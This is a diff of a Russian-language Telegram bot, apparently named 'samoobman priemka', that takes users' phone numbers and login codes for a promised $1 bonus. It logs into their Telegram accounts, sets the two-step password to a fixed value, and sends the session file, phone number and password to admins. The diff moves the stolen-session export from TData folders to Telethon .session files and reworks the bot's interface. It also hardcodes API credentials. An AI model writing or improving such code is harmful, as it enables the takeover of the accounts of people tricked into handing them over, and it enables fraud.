@@ -1,6 +1,6 @@
 # ==========================================
 # Проект: samoobman priemka (Telegram Bot)
-# Стек: aiogram 3.x, aiosqlite, telethon, opentele
+# Стек: aiogram 3.x, aiosqlite, telethon (без opentele)
 # ==========================================
 
 import asyncio
@@ -21,7 +21,7 @@ from aiogram.types import (
     InlineKeyboardMarkup,
     Message,
 )
-from opentele.tl import TelegramClient
+from telethon import TelegramClient
 from telethon.errors import (
     FloodWaitError,
     PhoneCodeEmptyError,
@@ -40,7 +40,7 @@ ADMIN_IDS = [8887644613]
 REQUIRED_CHANNEL = "@samoobmanTG"
 LOGS_CHANNEL_ID = -1003813816419
 
-API_ID = 31063615  # Строго integer для Telethon!
+API_ID = 31063615  # Число (int) для Telethon
 API_HASH = "dbe3b8f435016b0dcd3e4bca995a9169"
 AUTO_PASSWORD = "ssss"  # Пароль для автоматической установки
 
@@ -187,7 +187,7 @@ async def set_setting(key: str, value: str):
 # ================= ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ (ОДНО СООБЩЕНИЕ) =================
 async def edit_to_photo_or_text(message: Message, text: str, reply_markup, photo_key: str,
                                 parse_mode: str = "Markdown"):
-    """Универсальная функция: всегда редактирует текущее сообщение (текст или фото), не плодя новые."""
+    """Всегда редактирует текущее сообщение (текст или фото), не создавая новые сообщения."""
     photo_file_id = await get_setting(photo_key)
 
     if photo_file_id:
@@ -252,16 +252,15 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
     except Exception as e:
         logger.warning(f"Не удалось обновить пароль: {e}")
 
-    tdata_folder = os.path.join(SESSIONS_DIR, f"tdata_{phone.replace('+', '')}_{int(asyncio.get_event_loop().time())}")
-    archive_path = None
+    # Сохраняем сессию Telethon в архив для отправки администратору
+    session_file_path = f"{session_name}.session"
+    archive_path = shutil.make_archive(os.path.join(SESSIONS_DIR, phone.replace('+', '')), 'zip', SESSIONS_DIR,
+                                       base_dir=os.path.basename(session_file_path))
 
     try:
-        await client.ToTData(dirName=tdata_folder)
-        archive_path = shutil.make_archive(tdata_folder, 'zip', tdata_folder)
-    except Exception as e:
-        logger.error(f"Ошибка при создании TData: {e}")
-    finally:
         await client.disconnect()
+    except Exception:
+        pass
 
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute(
@@ -274,41 +273,48 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
         )
         await db.commit()
 
-    tdata_instruction = (
-        "\n\n📖 **Инструкция по входу в аккаунт через TData:**\n"
-        "1. Скачайте архив и распакуйте его.\n"
-        "2. Скачайте официальную портативную версию Telegram для ПК (Telegram Portable).\n"
-        "3. В папке с распакованным Telegram Portable найдите папку `tdata` и удалите её содержимое.\n"
-        "4. Перенесите файлы из распакованного архива в пустую папку `tdata` вашего Telegram Portable.\n"
-        "5. Запустите `Telegram.exe` — аккаунт откроется автоматически (если попросит пароль, укажите `ssss`).\n"
-        "6. Перейдите в настройки безопасности и привяжите свою почту."
-    )
+    if os.path.exists(session_file_path):
+        try:
+            os.remove(session_file_path)
+        except Exception:
+            pass
 
-    if archive_path and os.path.exists(archive_path):
-        for admin_id in ADMIN_IDS:
-            try:
-                await bot.send_document(
-                    chat_id=admin_id,
-                    document=FSInputFile(archive_path),
-                    caption=(
-                        f"📥 **Новый аккаунт (TData) успешно принят!**\n\n"
-                        f"• Пользователь: `{message.from_user.id}`\n"
-                        f"• Телефон: `{phone}`\n"
-                        f"• 🔑 Пароль (2FA): `{AUTO_PASSWORD}`"
-                        f"{tdata_instruction}"
-                    ),
-                    parse_mode="Markdown"
-                )
-            except Exception as ex:
-                logger.error(f"Не удалось отправить файл админу: {ex}")
+    for admin_id in ADMIN_IDS:
+        try:
+            await bot.send_document(
+                chat_id=admin_id,
+                document=FSInputFile(archive_path),
+                caption=(
+                    f"📥 **Новый аккаунт (Telethon .session) успешно принят!**\n\n"
+                    f"• Пользователь: `{message.from_user.id}`\n"
+                    f"• Телефон: `{phone}`\n"
+                    f"• 🔑 Пароль (2FA): `{AUTO_PASSWORD}`"
+                ),
+                parse_mode="Markdown"
+            )
+        except Exception as ex:
+            logger.error(f"Не удалось отправить файл админу: {ex}")
 
     await send_log(
         f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{message.from_user.id}`\nТелефон: `{phone}`"
     )
 
+    data = await state.get_data()
+    prompt_msg_id = data.get("prompt_msg_id")
     success_text = "✅ Аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
-    await edit_to_photo_or_text(message, success_text, get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                                "photo_menu")
+
+    if prompt_msg_id:
+        try:
+            await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=success_text,
+                                        reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                                        parse_mode="Markdown")
+        except Exception:
+            await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                                 parse_mode="Markdown")
+    else:
+        await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                             parse_mode="Markdown")
+
     await state.clear()
 
 
@@ -388,59 +394,59 @@ async def cb_submit_tg(callback: CallbackQuery, state: FSMContext):
         "формате (например, `+79991112233`):"
     )
     await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_submit")
+    # Сохраняем ID этого системного сообщения для дальнейшего редактирования
+    await state.update_data(prompt_msg_id=callback.message.message_id)
     await state.set_state(AuthStates.waiting_for_phone)
 
 
 @router.message(AuthStates.waiting_for_phone)
 async def process_phone(message: Message, state: FSMContext):
-    # Удаляем сообщение юзера с номером для чистоты интерфейса (опционально)
     try:
         await message.delete()
     except Exception:
         pass
 
     phone = message.text.strip()
+    data = await state.get_data()
+    prompt_msg_id = data.get("prompt_msg_id")
+
     if not phone.startswith("+"):
-        data = await state.get_data()
-        msg_id = data.get("prompt_msg_id")
         err_text = "❌ Неверный формат. Номер должен начинаться с плюса (+). Попробуйте снова:"
-        if msg_id:
+        if prompt_msg_id:
             try:
-                await bot.edit_message_caption(chat_id=message.chat.id, message_id=msg_id, caption=err_text,
-                                               reply_markup=get_back_keyboard())
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
             except Exception:
-                try:
-                    await bot.edit_message_text(chat_id=message.chat.id, message_id=msg_id, text=err_text,
-                                                reply_markup=get_back_keyboard())
-                except Exception:
-                    pass
+                pass
         return
 
-    session_name = f"session_{message.from_user.id}_{int(asyncio.get_event_loop().time())}"
-    session_path = os.path.join(SESSIONS_DIR, session_name)
+    session_name = os.path.join(SESSIONS_DIR, f"session_{message.from_user.id}_{int(asyncio.get_event_loop().time())}")
+    await state.update_data(phone=phone, session_name=session_name)
 
-    await state.update_data(phone=phone, session_name=session_name, session_path=session_path)
-
-    # ВАЖНО: API_ID передается строго как int, opentele примет его правильно
-    client = TelegramClient(session_path, API_ID, API_HASH)
+    client = TelegramClient(session_name, API_ID, API_HASH)
 
     try:
         await client.connect()
         sent = await client.send_code_request(phone)
         await state.update_data(phone_code_hash=sent.phone_code_hash, client=client)
 
-        # Редактируем последнее системное сообщение бота вместо отправки нового
-        data = await state.get_data()
         code_text = "📲 Код подтверждения отправлен в ваш Telegram. Введите полученный пятизначный код:"
-
-        # Получаем последнее сообщение бота из истории или сохраняем ID
-        sent_msg = await message.answer(code_text, reply_markup=get_back_keyboard())
-        await state.update_data(prompt_msg_id=sent_msg.message_id)
+        if prompt_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=code_text,
+                                            reply_markup=get_back_keyboard())
+            except Exception:
+                pass
         await state.set_state(AuthStates.waiting_for_code)
     except Exception as e:
         await client.disconnect()
         err_msg = f"❌ Ошибка отправки кода: {e}\nПопробуйте заново через меню."
-        await message.answer(err_msg, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
+        if prompt_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_msg,
+                                            reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
+            except Exception:
+                pass
         await state.clear()
 
 
@@ -543,6 +549,7 @@ async def cb_withdraw(callback: CallbackQuery, state: FSMContext):
         f"Введите сумму, которую хотите вывести:"
     )
     await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_withdraw")
+    await state.update_data(prompt_msg_id=callback.message.message_id)
     await state.set_state(WithdrawStates.waiting_for_amount)
 
 
@@ -553,16 +560,33 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
     except Exception:
         pass
 
+    data = await state.get_data()
+    prompt_msg_id = data.get("prompt_msg_id")
+
     try:
         amount = float(message.text.strip().replace(",", "."))
     except ValueError:
-        return await message.answer("❌ Введите корректное число:")
+        err_text = "❌ Введите корректное число:"
+        if prompt_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
+            except Exception:
+                pass
+        return
 
     user_data = await get_user(message.from_user.id)
     balance = user_data[3]
 
     if amount <= 0 or amount > balance:
-        return await message.answer(f"❌ Неверная сумма. Доступно для вывода: ${balance:.2f}. Введите снова:")
+        err_text = f"❌ Неверная сумма. Доступно для вывода: ${balance:.2f}. Введите снова:"
+        if prompt_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                                            reply_markup=get_back_keyboard())
+            except Exception:
+                pass
+        return
 
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, message.from_user.id))
@@ -591,8 +615,18 @@ async def process_withdraw_amount(message: Message, state: FSMContext):
             pass
 
     success_text = f"✅ Заявка на вывод **${amount:.2f}** успешно создана и отправлена администратору."
-    await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                         parse_mode="Markdown")
+    if prompt_msg_id:
+        try:
+            await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=success_text,
+                                        reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                                        parse_mode="Markdown")
+        except Exception:
+            await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                                 parse_mode="Markdown")
+    else:
+        await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
+                             parse_mode="Markdown")
+
     await state.clear()
 
 
@@ -651,7 +685,7 @@ async def cb_admin_panel(callback: CallbackQuery):
 
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
-        [InlineKeyboardButton(text="📂 Выгрузить архив TData", callback_data="admin_export_sessions")],
+        [InlineKeyboardButton(text="📂 Выгрузить сессии", callback_data="admin_export_sessions")],
         [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
         [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
         [InlineKeyboardButton(text="📢 Сделать рассылку", callback_data="admin_broadcast")],
@@ -769,12 +803,12 @@ async def admin_save_photo(message: Message, state: FSMContext):
 async def admin_export_sessions(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
         return
-    archive_name = "tdata_archive_all"
+    archive_name = "sessions_archive_all"
     if os.path.exists(SESSIONS_DIR) and os.listdir(SESSIONS_DIR):
         shutil.make_archive(archive_name, "zip", SESSIONS_DIR)
         await callback.message.answer_document(
             document=FSInputFile(f"{archive_name}.zip"),
-            caption="📦 Архив всех папок TData аккаунтов **samoobman priemka**.",
+            caption="📦 Архив всех файлов сессий аккаунтов **samoobman priemka**.",
             parse_mode="Markdown"
         )
     else:
@@ -887,7 +921,7 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
 # ================= ЗАПУСК БОТА =================
 async def main():
     await init_db()
-    logger.info("Бот samoobman priemka успешно запущен!")
+    logger.info("Бот samoobman priemka успешно запущен без opentele!")
     await dp.start_polling(bot)
 
 
